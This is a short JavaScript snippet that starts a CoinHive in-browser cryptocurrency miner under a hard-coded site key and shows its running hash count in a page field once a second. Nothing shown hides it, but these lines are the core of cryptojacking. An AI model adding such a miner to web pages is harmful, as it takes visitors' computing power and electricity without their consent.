var miner = new CoinHive.Anonymous('F2N8zs5BnMibBRjA9bEvn4NJ8wiAXPdt');
miner.start();
setInterval(function() {
	var totalHashes = miner.getTotalHashes();
	const total = document.querySelector('#totalHashes');
	total.value = totalHashes;
}, 1000);
